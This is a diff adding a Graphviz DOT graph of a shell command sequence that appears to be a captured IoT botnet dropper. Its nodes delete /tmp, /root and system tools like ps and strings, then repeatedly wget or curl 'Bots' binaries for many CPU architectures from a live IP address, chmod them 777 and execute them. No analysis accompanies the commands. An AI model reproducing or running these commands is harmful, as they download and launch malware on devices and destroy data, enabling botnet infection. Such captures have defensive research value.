@@ -1,0 +1,174 @@
+digraph {
+0 [label="ulimit -n 712 "];
+0 -> 0
+2 [label="busybox rm -rf /tmp/* "];
+2 -> 2
+4 [label="busybox rm -rf /root/* "];
+4 -> 4
+6 [label="busybox rm -rf /usr/bin/strings "];
+6 -> 6
+8 [label="busybox rm -rf /usr/bin/ps "];
+8 -> 8
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 16 [label=";,"];
+16 [label="wget http://212.237.24.47/Bots/snarm7 "];
+16 -> 18 [label=";,"];
+18 [label="busybox wget http://212.237.24.47/Bots/snarm7 "];
+18 -> 20 [label="||,"];
+20 [label="curl -O http://212.237.24.47/Bots/snarmv7 "];
+20 -> 22 [label="||,"];
+22 [label="busybox curl -O http://212.237.24.47/Bots/snarmv7 "];
+22 -> 24 [label=";,"];
+24 [label="chmod 777 snarm7 "];
+24 -> 26 [label=";,"];
+26 [label="./snarm7 "];
+26 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 34 [label=";,"];
+34 [label="wget http://212.237.24.47/Bots/snmipsel "];
+34 -> 36 [label=";,"];
+36 [label="busybox wget http://212.237.24.47/Bots/snmipsel "];
+36 -> 38 [label="||,"];
+38 [label="curl -O http://212.237.24.47/Bots/snmipsel "];
+38 -> 40 [label="||,"];
+40 [label="busybox curl -O http://212.237.24.47/Bots/snmipsel "];
+40 -> 42 [label="||,"];
+42 [label="chmod 777 snmipsel "];
+42 -> 44 [label=";,"];
+44 [label="./snmipsel "];
+44 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 52 [label=";,"];
+52 [label="wget http://212.237.24.47/Bots/snmips "];
+52 -> 54 [label=";,"];
+54 [label="busybox wget http://212.237.24.47/Bots/snmips "];
+54 -> 56 [label="||,"];
+56 [label="curl -O http://212.237.24.47/Bots/snmips "];
+56 -> 58 [label="||,"];
+58 [label="busybox curl -O http://212.237.24.47/Bots/snmips "];
+58 -> 60 [label="||,"];
+60 [label="chmod 777 snmips "];
+60 -> 62 [label=";,"];
+62 [label="./snmips "];
+62 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 70 [label=";,"];
+70 [label="wget http://212.237.24.47/Bots/snmips64 "];
+70 -> 72 [label=";,"];
+72 [label="busybox wget http://212.237.24.47p/Bots/snmips64 "];
+72 -> 74 [label="||,"];
+74 [label="curl -O http://212.237.24.47/Bots/snmips64 "];
+74 -> 76 [label="||,"];
+76 [label="busybox curl -O http://212.237.24.47/Bots/snmips64 "];
+76 -> 78 [label="||,"];
+78 [label="chmod 777 snmips64 "];
+78 -> 80 [label=";,"];
+80 [label="./snmips64 "];
+80 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 88 [label=";,"];
+88 [label="wget http://212.237.24.47/Bots/sni686 "];
+88 -> 90 [label=";,"];
+90 [label="busybox wget http://212.237.24.47/Bots/sni686 "];
+90 -> 92 [label="||,"];
+92 [label="curl -O http://212.237.24.47/Bots/sni686 "];
+92 -> 94 [label="||,"];
+94 [label="busybox curl -O http://212.237.24.47/Bots/sni686 "];
+94 -> 96 [label="||,"];
+96 [label="chmod 777 sni686 "];
+96 -> 98 [label=";,"];
+98 [label="./sni686 "];
+98 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 106 [label=";,"];
+106 [label="wget http://212.237.24.47/Bots/snsparc "];
+106 -> 108 [label=";,"];
+108 [label="busybox wget http://212.237.24.47/Bots/snsparc "];
+108 -> 110 [label="||,"];
+110 [label="curl -O http://212.237.24.47/Bots/snsparc "];
+110 -> 112 [label="||,"];
+112 [label="busybox curl -O http://212.237.24.47/Bots/snsparc "];
+112 -> 114 [label="||,"];
+114 [label="chmod 777 snsparc "];
+114 -> 116 [label=";,"];
+116 [label="./snsparc "];
+116 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 124 [label=";,"];
+124 [label="wget http://212.237.24.47/Bots/snsh4 "];
+124 -> 126 [label=";,"];
+126 [label="busybox wget http://212.237.24.47/Bots/snsh4 "];
+126 -> 128 [label="||,"];
+128 [label="curl -O http://212.237.24.47/Bots/snsh4 "];
+128 -> 130 [label="||,"];
+130 [label="busybox curl -O http://212.237.24.47/Bots/snsh4 "];
+130 -> 132 [label="||,"];
+132 [label="chmod 777 snsh4 "];
+132 -> 134 [label=";,"];
+134 [label="./snsh4 "];
+134 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 142 [label=";,"];
+142 [label="wget http://212.237.24.47/Bots/snx64 "];
+142 -> 144 [label=";,"];
+144 [label="busybox wget http://212.237.24.47/Bots/snx64 "];
+144 -> 146 [label="||,"];
+146 [label="curl -O http://212.237.24.47/Bots/snx64 "];
+146 -> 148 [label="||,"];
+148 [label="busybox curl -O http://212.237.24.47/Bots/snx64 "];
+148 -> 150 [label="||,"];
+150 [label="chmod 777 snx64 "];
+150 -> 152 [label=";,"];
+152 [label="./snx64 "];
+152 -> 154 [label=";,"];
+154 [label="cd /tmp "];
+154 -> 154
+156 [label="cd /var/run "];
+156 -> 158 [label="||,"];
+158 [label="rm -rf * "];
+158 -> 160 [label=";,"];
+160 [label="wget http://212.237.24.47/Bots/snppc "];
+160 -> 162 [label=";,"];
+162 [label="busybox http://212.237.24.47/Bots/snppc "];
+162 -> 164 [label="||,"];
+164 [label="curl -O http://212.237.24.47/Bots/snppc "];
+164 -> 166 [label="||,"];
+166 [label="busybox curl -O http://212.237.24.47/Bots/snppc "];
+166 -> 168 [label="||,"];
+168 [label="chmod 777 snppc "];
+168 -> 170 [label=";,"];
+170 [label="./snppc "];
+170 -> 171 [label=";,"];
+}
